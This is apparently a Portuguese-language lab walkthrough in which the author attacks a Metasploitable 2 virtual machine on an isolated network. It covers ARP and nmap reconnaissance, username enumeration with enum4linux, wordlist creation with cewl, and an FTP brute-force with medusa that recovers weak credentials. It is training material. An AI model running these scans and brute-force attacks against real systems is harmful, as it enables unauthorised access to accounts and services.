Decidi simular um cenário em que não se sabe a máquina vulnerável. Nesse caso, teríamos que mapear a rede e encontrar o host. Para isso, envio requisições ARP a fim de mapear a rede e "perguntar" quais hosts estão ativos. (Claro que nesse cenário controlado terá somente três: o servidor dhcp, o gateway o metasploitable 2)

```bash
┌──(kali㉿kali)-[~]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:d1:f8:5d brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.110/24 brd 192.168.56.255 scope global dynamic noprefixroute eth0
       valid_lft 400sec preferred_lft 400sec
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:fa:3b:5d brd ff:ff:ff:ff:ff:ff
    inet 192.168.15.10/24 brd 192.168.15.255 scope global dynamic noprefixroute eth1
       valid_lft 14211sec preferred_lft 14211sec
       
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan --interface=eth0 192.168.56.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:d1:f8:5d, IPv4: 192.168.56.110
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:19       (Unknown: locally administered)
192.168.56.100  08:00:27:d9:5d:9a       (Unknown)
192.168.56.109  08:00:27:e2:d4:9b       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.970 seconds (129.95 hosts/sec). 3 responded

```

Especifiquei a interface, pois deixei outra interface de rede em modo bridge para atualizar pacotes e instalar o seclists.

Sabendo que o metasploitable é a máquina 192.168.56.109, vou rodar o nmap contra ela.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC 192.168.56.109 -T5 -p- -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 16:26 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
Initiating ARP Ping Scan at 16:26
Scanning 192.168.56.109 [1 port]
Completed ARP Ping Scan at 16:26, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:26
Completed Parallel DNS resolution of 1 host. at 16:26, 0.01s elapsed
Initiating SYN Stealth Scan at 16:26
Scanning 192.168.56.109 [65535 ports]
Discovered open port 3306/tcp on 192.168.56.109
Discovered open port 139/tcp on 192.168.56.109
Discovered open port 445/tcp on 192.168.56.109
Discovered open port 53/tcp on 192.168.56.109
Discovered open port 23/tcp on 192.168.56.109
Discovered open port 80/tcp on 192.168.56.109
Discovered open port 25/tcp on 192.168.56.109
Discovered open port 22/tcp on 192.168.56.109
Discovered open port 111/tcp on 192.168.56.109
Discovered open port 5900/tcp on 192.168.56.109
Discovered open port 21/tcp on 192.168.56.109
Discovered open port 38844/tcp on 192.168.56.109
Discovered open port 513/tcp on 192.168.56.109
Discovered open port 8787/tcp on 192.168.56.109
Discovered open port 514/tcp on 192.168.56.109
Discovered open port 6000/tcp on 192.168.56.109
Discovered open port 38038/tcp on 192.168.56.109
Discovered open port 8009/tcp on 192.168.56.109
Discovered open port 58632/tcp on 192.168.56.109
Discovered open port 8180/tcp on 192.168.56.109
Discovered open port 41967/tcp on 192.168.56.109
Discovered open port 2049/tcp on 192.168.56.109
Discovered open port 2121/tcp on 192.168.56.109
Discovered open port 6667/tcp on 192.168.56.109
Discovered open port 3632/tcp on 192.168.56.109
Discovered open port 1524/tcp on 192.168.56.109
Discovered open port 512/tcp on 192.168.56.109
Discovered open port 1099/tcp on 192.168.56.109
Discovered open port 6697/tcp on 192.168.56.109
Discovered open port 5432/tcp on 192.168.56.109
Completed SYN Stealth Scan at 16:26, 41.82s elapsed (65535 total ports)
Initiating Service scan at 16:26
Scanning 30 services on 192.168.56.109
Completed Service scan at 16:28, 126.60s elapsed (30 services on 1 host)
NSE: Script scanning 192.168.56.109.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:28
NSE: [ftp-bounce 192.168.56.109:21] PORT response: 500 Illegal PORT command.
Completed NSE at 16:28, 9.16s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.47s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.01s elapsed
Nmap scan report for 192.168.56.109
Host is up, received arp-response (0.0014s latency).
Scanned at 2025-09-30 16:26:01 EDT for 178s
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 64 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.110
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
23/tcp    open  telnet      syn-ack ttl 64 Linux telnetd
25/tcp    open  smtp        syn-ack ttl 64 Postfix smtpd
|_ssl-date: 2025-09-30T20:28:59+00:00; 0s from scanner time.
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain/organizationalUnitName=Office for Complication of Otherwise Simple Affairs
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain/organizationalUnitName=Office for Complication of Otherwise Simple Affairs
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9:ad90:6c8f:2f73:74af:383b:2540:8828
| SHA-1: ed09:3088:7066:03bf:d5dc:2373:99b4:98da:2d4d:31c6
| -----BEGIN CERTIFICATE-----
| MIIDWzCCAsQCCQD6+TpMf7a5zDANBgkqhkiG9w0BAQUFADCB8TELMAkGA1UEBhMC
| WFgxKjAoBgNVBAgTIVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzET
| MBEGA1UEBxMKRXZlcnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09m
| ZmljZSBmb3IgQ29tcGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWly
| czEjMCEGA1UEAxMadWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG
| 9w0BCQEWH3Jvb3RAdWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wHhcNMTAwMzE3
| MTQwNzQ1WhcNMTAwNDE2MTQwNzQ1WjCB8TELMAkGA1UEBhMCWFgxKjAoBgNVBAgT
| IVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzETMBEGA1UEBxMKRXZl
| cnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09mZmljZSBmb3IgQ29t
| cGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWlyczEjMCEGA1UEAxMa
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG9w0BCQEWH3Jvb3RA
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANa0EzYzmpVxexvefIN12nGxPKl//q1kG3fpT66+ytT4y++uu0N5JHP/
| POWeO238yLGs+kxNXptMmVQL16hKULqp3h0f9ORrAqP0a0XNTK+NiWIzj2W7NmGf
| xCxzwU4uoKgUTphwRmG70bkx34yZ7nVreTxAoK6XAJCd3JkNM6S1AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEAkqS0uBRVYyVRSgvDKiLPOvgXagzPZqqnZS9Ibc3jPlyf
| d2zURFQfHoRPjtSN3awtiAkhqNpWLKkFPEloNRl1DNpTI4iIGS10JsEiZe4RaINq
| U0qcJ8ugtOmNKQyyPBhcZ8xTph4w0Komex6uQLkpAWwuvKIZlHwVbo0wOPbKLnU=
|_-----END CERTIFICATE-----
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
53/tcp    open  domain      syn-ack ttl 64 ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) DAV/2)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp   open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      41967/tcp   mountd
|   100005  1,2,3      42361/udp   mountd
|   100021  1,3,4      38844/tcp   nlockmgr
|   100021  1,3,4      57090/udp   nlockmgr
|   100024  1          38038/tcp   status
|_  100024  1          55088/udp   status
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        syn-ack ttl 64 netkit-rsh rexecd
513/tcp   open  login       syn-ack ttl 64 OpenBSD or Solaris rlogind
514/tcp   open  shell       syn-ack ttl 64 Netkit rshd
1099/tcp  open  java-rmi    syn-ack ttl 64 GNU Classpath grmiregistry
1524/tcp  open  bindshell   syn-ack ttl 64 Metasploitable root shell
2049/tcp  open  nfs         syn-ack ttl 64 2-4 (RPC #100003)
2121/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.3.1
3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, ConnectWithDatabase, SupportsTransactions, SupportsCompression, LongColumnFlag, SwitchToSSLAfterHandshake
|   Status: Autocommit
|_  Salt: Ny9MXSw~2|;NVF<9JGfM
3632/tcp  open  distccd     syn-ack ttl 64 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  syn-ack ttl 64 PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain/organizationalUnitName=Office for Complication of Otherwise Simple Affairs
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain/organizationalUnitName=Office for Complication of Otherwise Simple Affairs
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9:ad90:6c8f:2f73:74af:383b:2540:8828
| SHA-1: ed09:3088:7066:03bf:d5dc:2373:99b4:98da:2d4d:31c6
| -----BEGIN CERTIFICATE-----
| MIIDWzCCAsQCCQD6+TpMf7a5zDANBgkqhkiG9w0BAQUFADCB8TELMAkGA1UEBhMC
| WFgxKjAoBgNVBAgTIVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzET
| MBEGA1UEBxMKRXZlcnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09m
| ZmljZSBmb3IgQ29tcGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWly
| czEjMCEGA1UEAxMadWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG
| 9w0BCQEWH3Jvb3RAdWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wHhcNMTAwMzE3
| MTQwNzQ1WhcNMTAwNDE2MTQwNzQ1WjCB8TELMAkGA1UEBhMCWFgxKjAoBgNVBAgT
| IVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzETMBEGA1UEBxMKRXZl
| cnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09mZmljZSBmb3IgQ29t
| cGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWlyczEjMCEGA1UEAxMa
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG9w0BCQEWH3Jvb3RA
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANa0EzYzmpVxexvefIN12nGxPKl//q1kG3fpT66+ytT4y++uu0N5JHP/
| POWeO238yLGs+kxNXptMmVQL16hKULqp3h0f9ORrAqP0a0XNTK+NiWIzj2W7NmGf
| xCxzwU4uoKgUTphwRmG70bkx34yZ7nVreTxAoK6XAJCd3JkNM6S1AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEAkqS0uBRVYyVRSgvDKiLPOvgXagzPZqqnZS9Ibc3jPlyf
| d2zURFQfHoRPjtSN3awtiAkhqNpWLKkFPEloNRl1DNpTI4iIGS10JsEiZe4RaINq
| U0qcJ8ugtOmNKQyyPBhcZ8xTph4w0Komex6uQLkpAWwuvKIZlHwVbo0wOPbKLnU=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-30T20:28:59+00:00; 0s from scanner time.
5900/tcp  open  vnc         syn-ack ttl 64 VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         syn-ack ttl 64 (access denied)
6667/tcp  open  irc         syn-ack ttl 64 UnrealIRCd
6697/tcp  open  irc         syn-ack ttl 64 UnrealIRCd
8009/tcp  open  ajp13       syn-ack ttl 64 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
8787/tcp  open  drb         syn-ack ttl 64 Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
38038/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
38844/tcp open  nlockmgr    syn-ack ttl 64 1-4 (RPC #100021)
41967/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)
58632/tcp open  java-rmi    syn-ack ttl 64 GNU Classpath grmiregistry
MAC Address: 08:00:27:E2:D4:9B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-09-30T16:28:51-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   METASPLOITABLE<00>   Flags: <unique><active>
|   METASPLOITABLE<03>   Flags: <unique><active>
|   METASPLOITABLE<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59571/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 23952/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25731/udp): CLEAN (Failed to receive data)
|   Check 4 (port 32624/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.622MB)

```

Há 30 serviços rodando na máquina. Existem diversos possíveis vetores de ataque (a máquina já até possui uma backdoor na porta 1524), mas, como o exercício busca explorar brute-force, vou me ater a esse vetor.

Para esse propósito, vou utilizar a ferramenta medusa, mas antes disso, vou tentar criar um username/password list no contexto da máquina. Para criar esse dicionário, decidi uma ferramenta muito útil chamada cewl. Ela lê palavras-chave na página web que podemos usar como dicionário. 

```bash
┌──(kali㉿kali)-[~/desafio]
└─$ cewl http://192.168.56.109/ > user.txt

```

Agora, para evitar repetição de palavras, vou rodar o comando sort com uniq. Isso evitará testarmos com o mesmo usuário/senha.

```bash
┌──(kali㉿kali)-[~/desafio]
└─$ sort user.txt | uniq | tee user.txt         
AaA
abilities
ability
Ability
able
about
About
above
Above
ABOVE
absence
absolute

```

```bash
┌──(kali㉿kali)-[~/desafio]
└─$ cp user.txt pass.txt
```

Vou começar fazendo um ataque de dicionário no serviço ftp (porta 21)

O dicionário ficou muito grande, portanto, vou tentar enumerar alguns usuários do sistema com enum4linux

```bash
┌──(kali㉿kali)-[~/desafio]
└─$ enum4linux -U 192.168.56.109
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 30 17:38:28 2025

 =========================================( Target Information )=========================================
                                                                                                                  
Target ........... 192.168.56.109                                                                                 
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.56.109 )===========================
                                                                                                                  
                                                                                                                  
[+] Got domain/workgroup name: WORKGROUP                                                                          
                                                                                                                  
                                                                                                                  
 ==================================( Session Check on 192.168.56.109 )==================================
                                                                                                                  
                                                                                                                  
[+] Server 192.168.56.109 allows sessions using username '', password ''                                          
                                                                                                                  
                                                                                                                  
 ===============================( Getting domain SID for 192.168.56.109 )===============================
                                                                                                                  
Domain Name: WORKGROUP                                                                                            
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                              
                                                                                                                  
                                                                                                                  
 ======================================( Users on 192.168.56.109 )======================================
                                                                                                                  
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                              
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
enum4linux complete on Tue Sep 30 17:38:29 2025

                                                                                                                  
┌──(kali㉿kali)-[~/desafio]
└─$ 

```

Posso reduzir a lista a user, root, ftp e msfadmin. visto que o restante não é usuário do sistema (são usuários usados para rodar serviços)

Agora finalmente ao medusa. Rodando com 10 threads, levou aproximadamente 1 hora (não é muito).

```bash
┌──(kali㉿kali)-[~/desafio]
└─$ medusa -h 192.168.56.109 -U user.txt -P pass.txt -M ftp -t 10 -T 50 -O credentials.txt
Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-09-30 17:36:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.109 (1 of 1, 0 complete) User: user (1 of 5, 0 complete) Password: abilities (1 of 5160 complete)
2025-09-30 17:36:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.109 (1 of 1, 0 complete) User: user (1 of 5, 0 complete) Password: ability (2 of 5160 complete)
2025-09-30 17:36:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.109 (1 of 1, 0 complete) User: user (1 of 5, 0 complete) Password: about (3 of 5160 complete)
2025-09-30 17:36:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.109 (1 of 1, 0 complete) User: user (1 of 5, 0 complete) Password: About (4 of 5160 complete)
2025-09-30 17:36:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.109 (1 of 1, 0 complete) User: user (1 of 5, 0 complete) Password: Ability (5 of 5160 complete)
...
```


Encontramos algumas credenciais que podemos testar

```bash
┌──(kali㉿kali)-[~/desafio]
└─$ tail credentials.txt -f
# medusa -h 192.168.56.109 -U user.txt -P pass.txt -M ftp -t 10 -T 50 -O credentials.txt 
2025-09-30 18:00:46 ACCOUNT FOUND: [ftp] Host: 192.168.56.109 User: user Password: user [SUCCESS]
2025-09-30 18:40:52 ACCOUNT FOUND: [ftp] Host: 192.168.56.109 User: msfadmin Password: msfadmin [SUCCESS]
